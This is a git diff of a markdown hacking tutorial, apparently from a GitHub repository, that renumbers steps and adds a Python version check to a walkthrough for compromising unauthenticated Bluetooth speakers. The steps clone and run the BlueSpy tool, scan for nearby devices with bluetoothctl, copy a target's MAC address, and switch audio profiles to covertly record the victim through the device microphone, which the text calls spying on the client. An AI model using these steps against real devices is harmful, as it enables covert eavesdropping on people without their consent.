@@ -221,11 +221,24 @@ There is also an android bluetooth advertising/spammig app, we can get this app 
 ***Internet is mandatory here.
 In this technique a hacker compromise/hack a bluetooth device then ativates its  microphone and then do spy on the client. It easily attack on those bluetooth devices (speakers) which doesn't need any PIN parining for authentication.  
 
-#### Step 1 : Setup Bluetooth Enable (optional)
+
+#### Step 1 : Python version checking & Updating
+For this we need at least pythonV3.10, and to check it we use the following command :  
+```
+python3 --version
+```
+If the python version is less than 3.10, then we need to update it with the following command :  
+```
+sudo apt update
+sudo apt install python3.10
+```
+
+
+#### Step 2 : Setup Bluetooth Enable (optional)
 If bluetooth is not eanable or any related problem, then first enable Bluetooth with [this](https://github.com/stealthBS/demo1-repo/blob/main/network%20jamming.md#step-1--setup-bluetooth-enable-optional) step.  
 
 
-#### Step 2 : Software Cloning from GitHub repo
+#### Step 3 : Software Cloning from GitHub repo
 ```
 sudo apt update
 	- - - - sudo apt install python3   <optional. . .>
@@ -239,7 +252,7 @@ cd BlueSpy/
 It is now running the BlueSpy, and to do scanning and Spying we follow next step.  
 
 
-#### Step 3 : Scanning
+#### Step 4 : Scanning
 To pefrom Scanning and finding the target follow the below command : 
 ```
 bluetoothctl
@@ -249,14 +262,14 @@ scan on
 Don't close this tab, keep running it on side-by-side screen. From here we can recognize our target device, and then we simply copy its **MAC address** from here.  
 
 
-#### Step 4 : Spying details (not Attacking)
+#### Step 5 : Spying details (not Attacking)
 Open new tab side-by-side, and to perform Spying/recording the client follow the below command : (here we must be on `BlueSpy/` directory, otherwise follow step-2 last commands)  
 ```
 python3 BlueSpy.py -a <MAC address>
 ```
 From the above we will get a message whether the tageted device is vulnerable or not.
 
-#### Step 5 : Spying through recording
+#### Step 6 : Spying through recording
 Now recording to enable the recording follow the below commands : 
 ```
 pactl set-card-profile . . . . .
